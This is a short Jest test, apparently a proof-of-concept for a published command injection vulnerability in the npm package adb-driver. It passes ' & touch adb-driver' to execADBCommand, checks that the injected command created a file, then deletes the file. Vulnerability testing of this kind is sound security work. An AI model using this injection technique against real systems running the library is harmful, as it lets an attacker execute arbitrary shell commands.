// /https:/ / snyk.io / vuln / SNYK - JS - ADBDRIVER - 564430;
test("Command Injection in adb-driver", () => {
  const root = require("adb-driver");
  const fs = require("fs");
  const path = "./adb-driver";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root.execADBCommand(" & touch adb-driver");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
